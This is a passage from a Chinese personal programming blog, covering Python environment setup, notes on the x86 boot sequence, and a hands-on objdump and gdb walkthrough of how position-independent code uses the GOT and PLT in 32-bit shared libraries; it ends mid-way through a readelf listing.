<li>北邮人论坛：在线用户数据爬取(scrapy)</li>
<li>Hikvision视频监控系统：摄像头发现与默认密码登录(gevent)</li>
</ul>
<p>看了看不想写了……好麻烦……</p>
<p>如果有空，一点一点更吧。</p>
<h2 id="环境配置——工欲善其事，必先利其器">环境配置——工欲善其事，必先利其器</h2><p>我在linux下使用python，强烈建议任何没什么特殊要求的人在linux环境下使用python。最不济，也得是unix吧。</p>
<p>如果，你坚持在windows使用python。给您个参考：<a href="http://v2ex.com/t/127612" target="_blank" rel="external">http://v2ex.com/t/127612</a></p>
<p>所谓quick and dirty，是因为我实在没有本事把代码写得优美、高效，它能起作用，管它什么样子我也懒得去管它了。我个人没有不断优化啊封装啊的癖好和耐心。仅仅做到我想做的事就够了。</p>
<p>所以，如果下面的代码看上去不堪入目、那就对了……</p>
<p>首先讲环境的配置，强烈建议你使用ipython, ipython提供了一个增强太多的交互shell，让你能像使用matlab一样一边试验一边写代码，以一种迭代开发模式来完成心愿，我觉得这是解释型语言的一大优点。</p>
<p>另外python3能让生活变得简单，但也许你像我一样懒，那2就2吧。</p>
<p>linux下安装ipython很简单，用包管理器比如apt-get安装就是了，别傻兮兮的自己编译。</p>
<pre><code><span class="title">sudo</span> emerge ipython
</code></pre><p>还需要python的包管理器。一般叫pip或者python-pip或者类似名字的</p>
<pre><code><span class="title">sudo</span> emerge pip
</code></pre><p>接着需要安装一些常用的非标准库中的模块, 这时你可以使用linux的包管理器来装(查清楚名字，不同发行版打包不一样)，如果有的话最好。</p>
<pre><code><span class="title">sudo</span> emerge requests gevent lxml scrapy selenium
</code></pre><p>或者用pip来装。(有些模块会依赖其它东西比如lxml会依赖libxml2，要是我没记错的话，如果出错认真看错误信息，不会有什么奇葩问题)。</p>
<pre><code>pip install --<span class="keyword">user</span> <span class="title">requests</span> lxml gevent Scrapy selenium
</code></pre><p>如果想让人生简单一点，就别傻兮兮的下载各个python模块的包自己手动装。</p>
<p>然后，完事了，就是这么简单。别听上面的讨论瞎扯要什么四个小时，这时候就可以天马行空的hacking了，什么nose什么virtualenv等等真不是必要的。</p>
<p>linux下简单的配置，你就可以干很多事情了。不相信，那以后再说吧。</p>
<p>最后的结果，应该像这里<a href="https://www.python.org/shell/" target="_blank" rel="external">https://www.python.org/shell/</a></p>
<p>如果你那个交互式控制台加载不进来，那么你大概需要翻墙，不然google打不开、stackoverflow加载不了还怎么愉快地玩耍。chon同学似乎在做vpn <a href="https://moevpn.com/，" target="_blank" rel="external">https://moevpn.com/，</a> you may consider it。想想像chon大大这么用python构建严肃应用的才叫牛逼啊……</p>
<p>洗衣服去了，有兴致了再说，忘记了就算了。</p>
<p>基本爬虫这种东西，写着写着就从find到re从re到xpath/css selector最后没有啥性能要求的就愉快的开始selenium……</p>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/os/2015/03/30/boot-sequence/" itemprop="url">
                  boot sequence
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-30T00:00:00+08:00" content="2015-03-30">
              2015-03-30
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/os/" itemprop="url" rel="index">
                    <span itemprop="name">os</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/os/2015/03/30/boot-sequence/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="os/2015/03/30/boot-sequence/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <h2 id="POST">POST</h2><p>Power-on  Self-Test, 定位设备</p>
<h2 id="主引导记录">主引导记录</h2><p>如果设备的启动扇区的511和512字节是<code>0x55</code>和<code>0xAA</code>。BIOS会发现这样的启动扇区，载入内存<code>0x0000:0x7c00</code>(有些是<code>0x7c0:0x0000</code>， 同一个物理地址)。让<code>CS:IP</code>在启动扇区的最开始是个好的实践。</p>
<p>执行被移交给刚加载的启动记录。软盘上所有的512字节都会是可执行代码。硬盘上则在偏移为<code>0x0000-0x01bd</code>的主引导记录处放置可执行代码。然后是四个主分区的表条目，每个条目使用16字节(<code>0x01fd-0x01be</code>),还有两字节的签名(<code>0x01ef-0x01ff</code>)</p>
<h2 id="早期环境">早期环境</h2><p>早期执行环境高度依赖实现。特定的BIOS有特定的实现。不要做关于寄存器中内容的任何假设。也许被初始化为0,也许包含假的值。</p>
<p>CPU现在在实模式。你不仅要写激活保护模式的代码还要添加测试条件看看有没有激活。</p>
<h2 id="内核">内核</h2><p>启动载入器把内核载入内存并移交控制权。</p>
<h2 id="载入">载入</h2><p>我们已经知道要载入什么，但不知道如何载入。</p>
<p>如果从硬盘载入，引导记录(boot record)只有446字节大小。以下是内核镜像启动前必须要做的：</p>
<ul>
<li>从哪个分区启动</li>
<li>找到启动分区上的内核镜像</li>
<li>将内核镜像载入内存</li>
<li>激活实模式</li>
<li>为内核准备运行时环境</li>
</ul>
<p>不用按顺序来，但调用<code>kmain()</code>之前做完这些。</p>
<p>To make things worse，gcc只生成保护模式的可执行代码，所以这部分是你用C做不到的。</p>
<p>有几种解决问题的方式：</p>
<ul>
<li>geek loading：把上面列出的一切都挤压到引导记录中。这几乎不可能，会让接下来的特例处理和有用的错误信息无处安放。</li>
<li>One-stage loading: 写一个stub来转换，链接到内核镜像之前。引导记录加载内核镜像(在1mb(因为<code>[ES:BX]</code>0xffff x 0xffff = 1114095b约为1mb)内存标志下,实模式的最大内存上限),跳转到stub，stub转换到保护模式并准备运行环境，跳入内核。</li>
<li>Two-stage loading: 写一个分开的stub，这个stub载入到1mb内存标志下，然后做以上列表中的所有事。</li>
</ul>
<h3 id="传统方式">传统方式</h3><p>传统，MBR重定位到<code>0x0000:0x0600</code>，找到有用分区的分区表，载入分区表的第一个扇区(分区引导记录)至<code>0x0000:0x7c00</code>，并跳转到该地址。这叫链式载入，想要自己写的引导记录能双启动的话就模仿这种方式。</p>
<h3 id="简单方法">简单方法</h3><p>除非你真得想因为教学目的自制启动载入器(记录/stub)，推荐使用可用的启动载入器。</p>
<p>其中最突出的是GRUB，一个two-stage启动载入器，不仅提供能链式载入的启动菜单，而且准备好环境(包括保护模式和读取BIOS上有价值的信息)，把普通的可执行文件作为内核载入(而不是像很多启动载入器要求flat binary(不包含任何头的二进制文件))，支持可选的内核模块，不同的文件系统，甚至无盘启动(如果配置得当)</p>
<ul>
<li><a href="http://duartes.org/gustavo/blog/post/how-computers-boot-up" target="_blank" rel="external">How computers boot up</a></li>
<li><a href="http://duartes.org/gustavo/blog/post/kernel-boot-process" target="_blank" rel="external">The Kernel Boot Process</a></li>
<li><a href="http://www.ibm.com/developerworks/library/l-linuxboot/index.html" target="_blank" rel="external">Inside the Linux boot process</a></li>
</ul>

            
          </span>
        
      
    </div>

    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  
  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/linux/2015/03/19/position-independent-code-pic-in-shared-libraries/" itemprop="url">
                  Position Independent Code (PIC) in shared libraries
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            发表于
            <time itemprop="dateCreated" datetime="2015-03-19T00:00:00+08:00" content="2015-03-19">
              2015-03-19
            </time>
          </span>

          
            <span class="post-category" >
              &nbsp; | &nbsp; 分类于
              
                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
                  <a href="/categories/linux/" itemprop="url" rel="index">
                    <span itemprop="name">linux</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
              <span class="post-comments-count">
              &nbsp; | &nbsp;
              <a href="/linux/2015/03/19/position-independent-code-pic-in-shared-libraries/#comments" itemprop="discussionUrl">
                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="linux/2015/03/19/position-independent-code-pic-in-shared-libraries/" itemprop="commentsCount"></span>
              </a>
            </span>
            
          

          

        </div>
      </header>
    


    <div class="post-body">

      
      

      
        
          <span itemprop="articleBody">
            
              <p>动态载入有好几个问题：</p>
<ul>
<li>需要时间载入，每次引用都要重定位</li>
<li>让<code>.text</code>区域不能共享，浪费了RAM空间</li>
<li><code>.text</code>必须能写入带来安全问题</li>
</ul>
<p>PIC能解决这些问题：</p>
<p>PIC背后的思想很简单，为代码中的全局数据和函数引用外加一层重定向。通过利用链接和加载过程，可能让共享库中的<code>text</code>部分完全位置无关。它可以被映射到不同的内存地址无需修改。</p>
<h2 id="洞见1：text和data段之间的偏移">洞见1：text和data段之间的偏移</h2><p>PIC依赖于数据段和代码段之间的偏移，这些数据在链接时就被链接器知道了。当链接结合几个目标文件时，链接器手机不同目标文件的各个段然后合成一个。因此，链接器知道段的尺寸相对位置。</p>
<p>比如说数据段紧接着代码段，在代码段中引用数据段中某个数据的相对地址就能通过简单的计算得到。当前代码在代码段中的偏移已知，代码段基址与数据段之间的偏移已知，调用的相对地址就是两者之差。</p>
<pre><code>(地址由低到高，位置都是已知的)
text基址
<span class="attribute">...</span>
某需要相对引用指令-------<span class="subst">\</span>
<span class="attribute">...</span>                       |
<span class="built_in">data</span>基址                  |相对地址
<span class="attribute">...</span>                       |
被引用的数据      -------/
<span class="attribute">...</span>
</code></pre><h2 id="洞见2：基于程序指针的取址">洞见2：基于程序指针的取址</h2><p>x86没有对eip操作的指令，不能通过程序指针取地址，但x64可以啊</p>
<p>x86很多指令需要绝对地址，通过相对与程序指针取址可以得到。</p>
<p>很多shellcode用这个获取程序指针：</p>
<pre><code><span class="keyword">call</span> something
something：
    <span class="keyword">pop</span> <span class="literal">ebx</span>
</code></pre><p><code>ebx</code>中现在就是程序指针的值了</p>
<h2 id="数据索引">数据索引</h2><h3 id="全局偏移表(GOT)">全局偏移表(GOT)</h3><p>面试被问及这个怎么组织的？我不是很明白什么意思。早年曾经就跟着这篇文章打开gdb很好奇的看got/plt是怎么回事。</p>
<p>通过以上两个洞见，在x86上实现PIC也是可能的。通过GOT完成。</p>
<p>GOT就是一个地址表，在数据段中。当一个代码段中的指令想引用某个变量，不是直接通过绝对地址(需要重定位),而是引用GOT中的条目。显然GOT的地址确定，GOT的条目则将保存变量的绝对地址。</p>
<p><img src="http://eli.thegreenplace.net/images/2011/code_data_got_1.png" alt="got"></p>
<p>GOT中的条目还是得重定位= =，但相对于载入时重定位，有两个好处</p>
<ul>
<li>重定位每个变量只重定位一次</li>
<li>数据段是可写的，不被进程共享。添加重定位没什么影响。将重定位从代码段移过来，让代码段只读并且在进程间可以共享。</li>
</ul>
<h3 id="一个例子">一个例子</h3><p><code>ml_main_pic.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> myglob = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> c = b + ml_util_func(a);</span><br><span class="line">    myglob += c;</span><br><span class="line">    <span class="keyword">return</span> b + myglob;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译为PIC的动态库</p>
<pre><code>~<span class="regexp">/Work/</span><span class="keyword">project</span><span class="regexp">/blackhat/</span>eli  gcc -fPIC -m32 -g -shared ml_main_pic.c -o libmlpic.so
</code></pre><p>反汇编</p>
<pre><code> ~/Work/project/blackhat/eli  objdump -d -Mintel libmlpic_dataonly.so   
<span class="label">
libmlpic_dataonly.so:</span>     file format elf32-i386
...
0000053c &lt;ml_func&gt;:
 53c:   <span class="number">55</span>                      <span class="keyword">push</span>   <span class="literal">ebp</span>
 <span class="number">53d</span>:   <span class="number">89</span> e5                   <span class="keyword">mov</span>    <span class="literal">ebp</span>,<span class="literal">esp</span>
 53f:   e8 1a <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   55e &lt;__x86.get_pc_thunk.cx&gt;
 <span class="number">544</span>:   <span class="number">81</span> c1 bc 1a <span class="number">00</span> <span class="number">00</span>       <span class="keyword">add</span>    <span class="literal">ecx</span>,<span class="number">0x1abc</span>
 54a:   8b <span class="number">81</span> ec ff ff ff       <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ecx</span>-<span class="number">0x14</span>]
 <span class="number">550</span>:   8b <span class="number">10</span>                   <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">eax</span>]
 <span class="number">552</span>:   8b <span class="number">45</span> <span class="number">08</span>                <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0x8</span>]
 <span class="number">555</span>:   <span class="number">01</span> c2                   <span class="keyword">add</span>    <span class="literal">edx</span>,<span class="literal">eax</span>
 <span class="number">557</span>:   8b <span class="number">45</span> 0c                <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
 55a:   <span class="number">01</span> d0                   <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
 55c:   <span class="number">5d</span>                      <span class="keyword">pop</span>    <span class="literal">ebp</span>
 <span class="number">55d</span>:   c3                      <span class="keyword">ret</span>    

0000055e &lt;__x86.get_pc_thunk.cx&gt;:
 55e:   8b 0c <span class="number">24</span>                <span class="keyword">mov</span>    <span class="literal">ecx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">esp</span>]
 <span class="number">561</span>:   c3                      <span class="keyword">ret</span>    
 <span class="number">562</span>:   <span class="number">66</span> <span class="number">90</span>                   <span class="keyword">xchg</span>   <span class="literal">ax</span>,<span class="literal">ax</span>
</code></pre><p>53f是获取程序指针的方法，把程序指针放到<code>ecx</code>中。</p>
<p>在544后，<code>ecx</code>就持有GOT的地址。</p>
<p>54a后，将<code>myglob</code>在GOT中的的绝对地址放入<code>eax</code></p>
<p>550后，<code>myglob</code>的值被置入<code>edx</code></p>
<p>然后就是简单的加上<code>a</code>和<code>b</code>。</p>
<p>通过readelf可以查看共享库文件中GOT节信息</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -S libmlpic_dataonly.so 
There are <span class="number">33</span> section headers, starting at offset <span class="number">0x1320</span>:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  ...
  [<span class="number">19</span>] .got              PROGBITS        <span class="number">00001f</span>e8 <span class="number">000f</span>e8 <span class="number">000018</span> <span class="number">04</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span>
  [<span class="number">20</span>] .got.plt          PROGBITS        <span class="number">00002000</span> <span class="number">001000</span> <span class="number">000014</span> <span class="number">04</span>  WA  <span class="number">0</span>   <span class="number">0</span>  <span class="number">4</span>
  ...
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
</code></pre><p>我们算算ELF中写的和编译器做的是否符合。</p>
<pre><code><span class="number">0x544</span>+<span class="number">0x1abc</span>=<span class="number">0x2000</span>
</code></pre><p>正好是<code>.got.plt</code>节的虚拟地址。再计算下myglob地址在GOT中的位置</p>
<pre><code><span class="number">0x2000</span>-<span class="number">0x14</span>=<span class="number">0x1fec</span>
</code></pre><p>我们看看ELF文件中的信息:</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlpic_dataonly<span class="class">.so</span>

Relocation <span class="tag">section</span> <span class="string">'.rel.dyn'</span> at offset <span class="number">0</span>x358 contains <span class="number">9</span> entries:
 Offset     Info    Type            Sym<span class="class">.Value</span>  Sym. Name
 ...
<span class="number">00001</span>fec  <span class="number">00000606</span> R_386_GLOB_DAT    <span class="number">00002018</span>   myglob
...
</code></pre><p>正好，这里有个重定位。这个重定位就是让链接器把符号地址直接放到这里。</p>
<p>通过gdb看看：</p>
<pre><code> ~/Work/project/blackhat/eli  gcc -m32 -o driver driver.o -L. -lmlpic_dataonly
 ~/Work/project/blackhat/eli  gdb -q driver 
Reading symbols from /home/lyy/Work/project/blackhat/eli/driver..<span class="string">.done</span>.
(gdb)  break ml_func
Breakpoint <span class="number">1</span> <span class="preprocessor">at</span> <span class="number">0x80484c0</span>
(gdb) r
Starting program: /home/lyy/Work/project/blackhat/eli/driver 
<span class="label">warning:</span> the debug information found <span class="keyword">in</span> <span class="string">"/usr/lib64/debug/lib64/ld-2.17.so.debug"</span> does <span class="keyword">not</span> match <span class="string">"/lib/ld-linux.so.2"</span> (CRC mismatch).

addr myglob = <span class="number">0x804a024</span>

Breakpoint <span class="number">1</span>, ml_func (a=<span class="number">1</span>, b=<span class="number">1</span>) <span class="preprocessor">at</span> ml_main_pic.c:<span class="number">5</span>
<span class="number">5</span>           return myglob + a + b<span class="comment">;</span>
(gdb) disas ml_func
Dump of assembler code for function ml_func:
   <span class="number">0xf7fd853c</span> &lt;+<span class="number">0</span>&gt;:     <span class="keyword">push</span>   <span class="literal">ebp</span>
   <span class="number">0xf7fd853d</span> &lt;+<span class="number">1</span>&gt;:     <span class="keyword">mov</span>    <span class="literal">ebp</span>,<span class="literal">esp</span>
   <span class="number">0xf7fd853f</span> &lt;+<span class="number">3</span>&gt;:     <span class="keyword">call</span>   <span class="number">0xf7fd855e</span> &lt;__x86.get_pc_thunk.cx&gt;
   <span class="number">0xf7fd8544</span> &lt;+<span class="number">8</span>&gt;:     <span class="keyword">add</span>    <span class="literal">ecx</span>,<span class="number">0x1abc</span>
=&gt; <span class="number">0xf7fd854a</span> &lt;+<span class="number">14</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ecx</span>-<span class="number">0x14</span>]
   <span class="number">0xf7fd8550</span> &lt;+<span class="number">20</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">edx</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">eax</span>]
   <span class="number">0xf7fd8552</span> &lt;+<span class="number">22</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0x8</span>]
   <span class="number">0xf7fd8555</span> &lt;+<span class="number">25</span>&gt;:    <span class="keyword">add</span>    <span class="literal">edx</span>,<span class="literal">eax</span>
   <span class="number">0xf7fd8557</span> &lt;+<span class="number">27</span>&gt;:    <span class="keyword">mov</span>    <span class="literal">eax</span>,<span class="preprocessor">DWORD</span> <span class="preprocessor">PTR</span> [<span class="literal">ebp</span>+<span class="number">0xc</span>]
   <span class="number">0xf7fd855a</span> &lt;+<span class="number">30</span>&gt;:    <span class="keyword">add</span>    <span class="literal">eax</span>,<span class="literal">edx</span>
   <span class="number">0xf7fd855c</span> &lt;+<span class="number">32</span>&gt;:    <span class="keyword">pop</span>    <span class="literal">ebp</span>
   <span class="number">0xf7fd855d</span> &lt;+<span class="number">33</span>&gt;:    <span class="keyword">ret</span>    
End of assembler dump.
(gdb) i registers 
<span class="literal">eax</span>            <span class="number">0x1</span>      <span class="number">1</span>
<span class="literal">ecx</span>            <span class="number">0xf7fda000</span>       -<span class="number">134373376</span>
...
(gdb) p/x <span class="number">0xf7fda000</span>-<span class="number">0x14</span> # GOT中glob绝对地址地址
<span class="number">$2</span> = <span class="number">0xf7fd9fec</span>
(gdb) x/x <span class="number">0xf7fd9fec</span>
<span class="number">0xf7fd9fec</span>:     <span class="number">0x0804a024</span>
(gdb) p &amp;myglob 
<span class="number">$4</span> = (<span class="keyword">int</span> *) <span class="number">0x804a024</span> &lt;myglob&gt;
</code></pre><p>就是这样</p>
<h2 id="函数调用">函数调用</h2><p>额，函数调用，阿里电面时问我GOT干什么的，我说解析函数的吧。。。。。。(就是因为当年看得这篇留下的残缺印象)，当时为什么看这篇文章呢？因为发现函数调用竟然都不是直接调用的！！！</p>
<p>函数不是像数据这样简单的引用的。</p>
<h3 id="惰性绑定优化">惰性绑定优化</h3><p>共享库引用一个函数时，函数地址在载入时才能确定。解析这个地址的过程叫做绑定(binding)。这就是动态载入器把共享库载入进程内存空间时所做的。这个绑定过程不简单，载入器不得不通过在特殊的表中查找函数符号来实现。(共享库ELF目标文件确实有以此为目的的特殊的哈希表节)</p>
<p>解析函数花时间，一般函数比全局变量多太多了，更何况很多函数可能根本不会被调用(比如错误处理或特殊情况)。</p>
<p>为了加速函数绑定的过程，智能惰性绑定机制被设计出来。所谓惰性就是在需要的时候再做什么，计算机科学中很多应用比如<a href="http://en.wikipedia.org/wiki/Copy-on-write" target="_blank" rel="external">惰性求值</a>和<a href="http://en.wikipedia.org/wiki/Lazy_evaluation" target="_blank" rel="external">copy-on-write</a></p>
<p>惰性绑定机制通过又一层重定向实现——PLT.</p>
<h3 id="过程链接表(PLT)">过程链接表(PLT)</h3><p>PLT是可执行的<code>.text</code>一部分，包含一系列条目(每个条目对应一个共享库调用的外部函数)</p>
<p>每个PLT条目都是段简短的可执行代码。</p>
<p>代码调用PLT中的条目而不是直接调用函数，PLT中条目负责真正调用函数。</p>
<p>这个设计被成为蹦床(‘trampoline’)<a href="这让我想起了函数式编程的一种优化递归设计。">^1</a>，每个PLT条目对应也在GOT中一个包含函数实际偏移的条目，但仅仅动态载入器解析它后才会对应上。</p>
<p>PLT允许惰性解析，当共享库首次被载入后，函数调用还没被解析：</p>
<p><img src="http://eli.thegreenplace.net/images/2011/plt_before.png" alt="调用时的解析过程"></p>
<p>一点解说：PLT的第一个条目调用解析程序，该程序在动态链接器里(每个都有)。这个程序将把函数的实际地址解析。</p>
<h4 id="第一次">第一次</h4><p>于是乎，当func第一次被调用时，调用<code>PLT[n]</code>的例程，接着根据<code>GOT[n]</code>中的内容跳到准备解析的指令，接着调用解析器，解析器会把func函数的实际地址写入<code>GOT[n]</code>然后调用<code>func</code>。</p>
<h4 id="第二次">第二次</h4><p><img src="http://eli.thegreenplace.net/images/2011/plt_after.png" alt="事情不再相同"></p>
<p>这时候<code>GOT[n]</code>中已经有函数实际地址，从PLT条目直接就跳到函数func的实际代码开始执行。</p>
<p>不再需要解析器，只有一层多余的跳转。这样实际不用的函数永远不用被解析。</p>
<p>同时，这个设计实现了库中代码段完全位置无关。只有GOT中使用了绝对地址，而GOT在数据段中并且会被动态载入器重定位。即使PLT自身都是PIC的，能放到只读的代码段中。</p>
<p>解析器只是一段载入器里的程序，PLT条目中准备的参数，何时的重定向条目帮助它知道需要解析的符号和需要更新的GOT条目。</p>
<h3 id="通过PLT和GOT实现的PIC函数调用——实例">通过PLT和GOT实现的PIC函数调用——实例</h3><p>费曼说：What I can not create, I do not understand. 我们自己亲手做做</p>
<pre><code> ~/Work/project/blackhat/eli  cat ml_main_pic.c
<span class="keyword">int</span> myglob = <span class="number">42</span>;

<span class="function"><span class="keyword">int</span> <span class="title">ml_util_func</span><span class="params">(<span class="keyword">int</span> a)</span>
</span>{
    <span class="keyword">return</span> a + <span class="number">1</span>;
}

<span class="function"><span class="keyword">int</span> <span class="title">ml_func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span>
</span>{
    <span class="keyword">int</span> c = b + ml_util_func(a);
    myglob += c;
    <span class="keyword">return</span> b + myglob;
}

 ~/Work/project/blackhat/eli  gcc -fPIC -m32 -g -shared ml_main_pic.c -o libmlpic.so

 ~/Work/project/blackhat/eli  objdump -d -Mintel libmlpic.so 

libmlpic.so:     file format elf32-i386
...
<span class="number">00000440</span> &lt;ml_util_func@plt&gt;:
 <span class="number">440</span>:   ff a3 <span class="number">14</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       jmp    DWORD PTR [ebx+<span class="number">0x14</span>]
 <span class="number">446</span>:   <span class="number">68</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   <span class="number">0x10</span>
 <span class="number">44</span>b:   e9 c0 ff ff ff          jmp    <span class="number">410</span> &lt;_init+<span class="number">0x30</span>&gt;
...
<span class="number">0000057</span>c &lt;ml_util_func&gt;:
 <span class="number">57</span>c:   <span class="number">55</span>                      push   ebp
 <span class="number">57</span>d:   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">57f</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
 <span class="number">582</span>:   <span class="number">83</span> c0 <span class="number">01</span>                add    eax,<span class="number">0x1</span>
 <span class="number">585</span>:   <span class="number">5</span>d                      pop    ebp
 <span class="number">586</span>:   c3                      ret    

<span class="number">00000587</span> &lt;ml_func&gt;:
 <span class="number">587</span>:   <span class="number">55</span>                      push   ebp
 <span class="number">588</span>:   <span class="number">89</span> e5                   mov    ebp,esp
 <span class="number">58</span>a:   <span class="number">53</span>                      push   ebx
 <span class="number">58</span>b:   <span class="number">83</span> ec <span class="number">24</span>                sub    esp,<span class="number">0x24</span>
 <span class="number">58</span>e:   e8 bd fe ff ff          call   <span class="number">450</span> &lt;__x86.get_pc_thunk.bx&gt;
 <span class="number">593</span>:   <span class="number">81</span> c3 <span class="number">6</span>d <span class="number">1</span>a <span class="number">00</span> <span class="number">00</span>       add    ebx,<span class="number">0x1a6d</span>
 <span class="number">599</span>:   <span class="number">8</span>b <span class="number">45</span> <span class="number">08</span>                mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]
 <span class="number">59</span>c:   <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                mov    DWORD PTR [esp],eax
 <span class="number">59f</span>:   e8 <span class="number">9</span>c fe ff ff          call   <span class="number">440</span> &lt;ml_util_func@plt&gt;
 ...
</code></pre><p>注意59f行的调用，这时<code>ebx</code>是<code>GOT</code>的基址(做减法寻址。。。好奇怪)。</p>
<p>注意440行,PLT条目包含的三部分，一个指向GOT条目中指向的跳转，一个准备解析器参数，一个调用解析器。</p>
<p>我们不在乎410的解析器(PLT[0])</p>
<p>在593的时候获得了<code>eip</code>，接着被加上<code>0x1a6d</code>。GOT的基址就是这个了。</p>
<pre><code><span class="number">0x593</span>+<span class="number">0x1a6d</span>=<span class="number">0x2000</span>
</code></pre><p>可以用<code>readelf</code>看看</p>
<pre><code> ~/Work/project/blackhat/eli  readelf -x <span class="class">.got</span><span class="class">.plt</span> libmlpic<span class="class">.so</span> 

Hex dump of <span class="tag">section</span> <span class="string">'.got.plt'</span>:
  <span class="number">0</span>x00002000 <span class="number">001</span>f0000 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">26040000</span> ............&amp;...
  <span class="number">0</span>x00002010 <span class="number">36040000</span> <span class="number">46040000</span>                   <span class="number">6</span>..<span class="class">.F</span>...
</code></pre><p>条目<code>ml_util_func@plt</code>查看的GOT条目在<code>+0x14</code>位置，即<code>0x2014</code>,上图中可见是<code>0x446</code></p>
<p>正好是<code>ml_util_func@plt</code>中<code>push</code>那一行。</p>
<p>为了让动态链接器能起作用，重定位条目也被添加来指定在GOT中的哪个位置重定位<code>ml_util_func</code></p>
<pre><code> ~/Work/project/blackhat/eli  readelf -r libmlpic.so

Relocation section '.rel.dyn' at offset 0x380 contains 9 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
00001ef4  <span class="number">00000008</span> R_386_RELATIVE   
00001ef8  <span class="number">00000008</span> R_386_RELATIVE   
<span class="number">00002018</span>  <span class="number">00000008</span> R_386_RELATIVE   
00001fe8  <span class="number">00000106</span> R_386_GLOB_DAT    <span class="number">00000000</span>   _ITM_deregisterTMClone
00001fec  <span class="number">00000606</span> R_386_GLOB_DAT    <span class="number">0000201</span>c   myglob
00001ff0  <span class="number">00000206</span> R_386_GLOB_DAT    <span class="number">00000000</span>   __cxa_finalize
00001ff4  <span class="number">00000306</span> R_386_GLOB_DAT    <span class="number">00000000</span>   __gmon_start__
00001ff8  <span class="number">00000406</span> R_386_GLOB_DAT    <span class="number">00000000</span>   _Jv_RegisterClasses
00001ffc  <span class="number">00000506</span> R_386_GLOB_DAT    <span class="number">00000000</span>   _ITM_registerTMCloneTa

Relocation section '.rel.plt' at offset 0x3c8 contains 3 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
<span class="number">0000200</span>c  <span class="number">00000207</span> R_386_JUMP_SLOT   <span class="number">00000000</span>   __cxa_finalize
